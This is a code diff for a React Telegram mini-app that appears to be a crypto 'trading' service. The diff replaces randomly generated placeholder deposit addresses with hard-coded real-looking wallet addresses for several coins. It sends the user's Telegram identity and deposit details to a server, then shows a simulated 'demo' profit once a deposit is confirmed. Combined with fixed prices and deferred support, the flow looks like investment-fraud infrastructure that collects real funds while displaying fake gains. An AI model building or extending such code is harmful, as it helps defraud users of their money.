@@ -16,31 +16,36 @@ const depositAssetMeta = {
     name: "Bitcoin",
     network: "BTC",
     usdPrice: 43210,
-    decimals: 6
+    decimals: 6,
+    address: "bc1qcps30ljm5e547489spjgpr6yygv2dwzhcuz9wx"
   },
   ETH: {
     name: "Ethereum",
     network: "ERC-20",
     usdPrice: 2280,
-    decimals: 5
+    decimals: 5,
+    address: "0xc92358875686C8B4C5c93043899Ab8d239ae4cCB"
   },
   USDT: {
     name: "Tether",
-    network: "TRC-20",
+    network: "ERC-20",
     usdPrice: 1,
-    decimals: 2
+    decimals: 2,
+    address: "0xc92358875686C8B4C5c93043899Ab8d239ae4cCB"
   },
   DOGE: {
     name: "Dogecoin",
     network: "DOGE",
     usdPrice: 0.082,
-    decimals: 2
+    decimals: 2,
+    address: "DDjv4o6dA2YBbo18b4dzk6NmRx2PEX4P7A"
   },
   SOL: {
     name: "Solana",
     network: "SOL",
     usdPrice: 145,
-    decimals: 4
+    decimals: 4,
+    address: "HQ2Ea3zXmv5x8axce5nsgZKBPCMkZGCPJoQnmjQzoYeh"
   }
 };
 
@@ -265,6 +270,7 @@ const uiText = {
       supportBeta: "Тех. поддержка подключится в следующем обновлении.",
       supportTicket: (ticket) =>
         `Если средства не пришли за 20 минут, обратись в техподдержку и передай номер транзакции ${ticket}.`,
+      depositNotifyFailed: "Баланс обновлен, но сообщение в Telegram не отправилось. Проверь TELEGRAM_BOT_TOKEN и chat id.",
       amountInvalid: "Введите сумму в долларах.",
       amountMinimum: (min) => `Минимальная сумма пополнения - $${min}.`,
       sendNeedDeposit: "Сначала нужно пополнить баланс.",
@@ -479,6 +485,8 @@ const uiText = {
       supportBeta: "Support will connect in the next update.",
       supportTicket: (ticket) =>
         `If funds do not arrive within 20 minutes, contact support and provide transaction number ${ticket}.`,
+      depositNotifyFailed:
+        "Balance was updated, but the Telegram message was not sent. Check TELEGRAM_BOT_TOKEN and target chat id.",
       amountInvalid: "Enter an amount in USD.",
       amountMinimum: (min) => `Minimum funding amount is $${min}.`,
       sendNeedDeposit: "You need to fund the balance first.",
@@ -516,31 +524,29 @@ const isBearishTrend = (trend) => /bear|медвеж/i.test(String(trend || ""))
 const localizeTrend = (trend, copy) =>
   isBearishTrend(trend) ? copy.marketStatus.bearish : copy.marketStatus.bullish;
 
-const randomFromCharset = (length, charset) =>
-  Array.from({ length }, () => charset[Math.floor(Math.random() * charset.length)]).join("");
-
 const createReferenceNumber = (prefix) =>
-  `${prefix}-${Date.now().toString(36).toUpperCase()}-${randomFromCharset(6, "ABCDEFGHJKLMNPQRSTUVWXYZ23456789")}`;
+  `${prefix}-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).slice(2, 8).toUpperCase()}`;
 
-const createDepositAddress = (symbol) => {
-  if (symbol === "BTC") {
-    return `bc1q${randomFromCharset(26, "acdefghjklmnpqrstuvwxyz023456789")}`;
+const getTelegramUser = () => {
+  if (typeof window === "undefined") {
+    return null;
   }
 
-  if (symbol === "ETH") {
-    return `0x${randomFromCharset(40, "abcdef0123456789")}`;
+  const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
+
+  if (!user?.id) {
+    return null;
   }
 
-  if (symbol === "USDT") {
-    return `T${randomFromCharset(33, "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz")}`;
-  }
-
-  if (symbol === "DOGE") {
-    return `D${randomFromCharset(33, "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz")}`;
-  }
-
-  return randomFromCharset(44, "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz");
+  return {
+    id: String(user.id),
+    username: user.username || "",
+    firstName: user.first_name || "",
+    lastName: user.last_name || ""
+  };
 };
+
+const getPersistedStateKey = (userId) => `pegas-app-state:${userId || "guest"}`;
 
 function App() {
   const [tab, setTab] = useState("home");
@@ -552,6 +558,7 @@ function App() {
   const [depositCurrency, setDepositCurrency] = useState("USDT");
   const [generatedDeposit, setGeneratedDeposit] = useState(null);
   const [isDepositGenerating, setDepositGenerating] = useState(false);
+  const [isDepositConfirming, setDepositConfirming] = useState(false);
   const [demoAmount, setDemoAmount] = useState(0);
   const [demoProfit, setDemoProfit] = useState(0);
   const [demoPercent, setDemoPercent] = useState(0);
@@ -567,6 +574,9 @@ function App() {
   const [isTabAnimating, setTabAnimating] = useState(false);
   const [tabDirection, setTabDirection] = useState(1);
   const [pendingHomeAction, setPendingHomeAction] = useState(null);
+  const [telegramUser, setTelegramUser] = useState(null);
+  const [isTelegramReady, setTelegramReady] = useState(false);
+  const [isStateHydrated, setStateHydrated] = useState(false);
   const simulationRef = useRef(null);
   const heroDismissRef = useRef(null);
   const tabTransitionRef = useRef(null);
@@ -581,6 +591,19 @@ function App() {
   const activityPreview = activityFeed.slice(0, 2);
   const hasMoreActivities = activityFeed.length > 2;
   const rewardPrograms = copy.rewardPrograms;
+  const persistedAppState = useMemo(
+    () => ({
+      currentAsset,
+      demoAmount,
+      demoProfit,
+      demoPercent,
+      totalDeposited,
+      totalTraded,
+      isHeroVisible,
+      activityFeed
+    }),
+    [activityFeed, currentAsset, demoAmount, demoPercent, demoProfit, isHeroVisible, totalDeposited, totalTraded]
+  );
   const candleSeries = useMemo(() => {
     if (!marketData?.ohlc?.length) {
       return [];
@@ -742,6 +765,8 @@ function App() {
     const tg = window.Telegram?.WebApp;
 
     if (!tg) {
+      setTelegramUser(getTelegramUser());
+      setTelegramReady(true);
       return;
     }
 
@@ -750,6 +775,8 @@ function App() {
     tg.setHeaderColor("#020503");
     tg.setBackgroundColor("#000000");
     tg.MainButton.hide();
+    setTelegramUser(getTelegramUser());
+    setTelegramReady(true);
 
     return () => {
       tg.MainButton.hide();
@@ -779,6 +806,117 @@ function App() {
       document.body.classList.remove("modal-open");
     };
   }, [isDepositOpen, isExchangeOpen]);
+
+  useEffect(() => {
+    if (!isTelegramReady) {
+      return;
+    }
+
+    let cancelled = false;
+
+    const applyPersistedState = (state) => {
+      if (!state || cancelled) {
+        return;
+      }
+
+      setCurrentAsset(assetMeta[state.currentAsset] ? state.currentAsset : "lyn");
+      setDemoAmount(Number(state.demoAmount) || 0);
+      setDemoProfit(Number(state.demoProfit) || 0);
+      setDemoPercent(Number(state.demoPercent) || 0);
+      setTotalDeposited(Number(state.totalDeposited) || 0);
+      setTotalTraded(Number(state.totalTraded) || 0);
+      setHeroVisible(state.isHeroVisible !== false);
+      setActivityFeed(Array.isArray(state.activityFeed) ? state.activityFeed : defaultActivities);
+      setDemoRunning(false);
+    };
+
+    const loadPersistedState = async () => {
+      setStateHydrated(false);
+
+      const storageKey = getPersistedStateKey(telegramUser?.id);
+      let fallbackState = null;
+
+      if (typeof window !== "undefined") {
+        try {
+          const raw = window.localStorage.getItem(storageKey);
+          fallbackState = raw ? JSON.parse(raw) : null;
+        } catch {
+          fallbackState = null;
+        }
+      }
+
+      if (!telegramUser?.id) {
+        applyPersistedState(fallbackState);
+        if (!cancelled) {
+          setStateHydrated(true);
+        }
+        return;
+      }
+
+      try {
+        const response = await fetch(`/api/app-state/${telegramUser.id}`);
+        const payload = await response.json();
+
+        if (!cancelled && response.ok && payload.state) {
+          applyPersistedState(payload.state);
+        } else {
+          applyPersistedState(fallbackState);
+        }
+      } catch {
+        applyPersistedState(fallbackState);
+      } finally {
+        if (!cancelled) {
+          setStateHydrated(true);
+        }
+      }
+    };
+
+    loadPersistedState();
+
+    return () => {
+      cancelled = true;
+    };
+  }, [isTelegramReady, telegramUser?.id]);
+
+  useEffect(() => {
+    if (!isStateHydrated) {
+      return;
+    }
+
+    const storageKey = getPersistedStateKey(telegramUser?.id);
+
+    if (typeof window !== "undefined") {
+      window.localStorage.setItem(storageKey, JSON.stringify(persistedAppState));
+    }
+
+    if (!telegramUser?.id) {
+      return;
+    }
+
+    const controller = new AbortController();
+    const timer = window.setTimeout(async () => {
+      try {
+        await fetch("/api/app-state", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            userId: telegramUser.id,
+            state: persistedAppState
+          }),
+          signal: controller.signal
+        });
+      } catch {
+        return;
+      }
+    }, 180);
+
+    return () => {
+      window.clearTimeout(timer);
+      controller.abort();
+    };
+  }, [isStateHydrated, persistedAppState, telegramUser?.id]);
 
   useEffect(() => {
     return () => {
@@ -902,6 +1040,7 @@ function App() {
     }
 
     setDepositGenerating(false);
+    setDepositConfirming(false);
     setDepositOpen(false);
     setGeneratedDeposit(null);
   };
@@ -1129,7 +1268,7 @@ function App() {
       amountUsd: amount,
       cryptoAmount,
       decimals: asset.decimals,
-      wallet: createDepositAddress(depositCurrency),
+      wallet: asset.address,
       ticket: createReferenceNumber("PG")
     });
   };
@@ -1145,6 +1284,39 @@ function App() {
       setDepositGenerating(false);
       generateDepositRequest();
     }, DEPOSIT_GENERATION_DELAY_MS);
+  };
+
+  const handleDepositConfirm = async () => {
+    if (!generatedDeposit || isDepositConfirming) {
+      return;
+    }
+
+    setDepositConfirming(true);
+
+    try {
+      const response = await fetch("/api/deposits/confirm", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          userId: telegramUser?.id || null,
+          notifyChatId: telegramUser?.id || null,
+          user: telegramUser,
+          deposit: generatedDeposit
+        })
+      });
+
+      if (!response.ok) {
+        const payload = await response.json().catch(() => ({}));
+        throw new Error(payload.error || "Failed to notify Telegram");
+      }
+    } catch {
+      showBetaAlert(copy.alerts.depositNotifyFailed);
+    } finally {
+      setDepositConfirming(false);
+      startDemoSimulation(generatedDeposit.amountUsd, generatedDeposit.symbol);
+    }
   };
 
   const getRewardProgress = (program) =>
@@ -1756,6 +1928,7 @@ function App() {
                       <button
                         className="ghost-link support-link"
                         type="button"
+                        disabled={isDepositConfirming}
                         onClick={() => openSupport(generatedDeposit.ticket)}
                       >
                         {copy.modal.support}
@@ -1769,12 +1942,12 @@ function App() {
               <button
                 className="primary-button shimmer-button button-loading"
                 type="button"
-                data-busy={isDepositGenerating ? "true" : undefined}
-                aria-busy={isDepositGenerating}
-                disabled={isDepositGenerating}
+                data-busy={isDepositGenerating || isDepositConfirming ? "true" : undefined}
+                aria-busy={isDepositGenerating || isDepositConfirming}
+                disabled={isDepositGenerating || isDepositConfirming}
                 onClick={
                   generatedDeposit
-                    ? () => startDemoSimulation(generatedDeposit.amountUsd, generatedDeposit.symbol)
+                    ? handleDepositConfirm
                     : handleDepositGenerate
                 }
               >
@@ -1783,7 +1956,7 @@ function App() {
               <button
                 className="secondary-button"
                 type="button"
-                disabled={isDepositGenerating}
+                disabled={isDepositGenerating || isDepositConfirming}
                 onClick={closeDepositModal}
               >
                 {copy.modal.cancel}
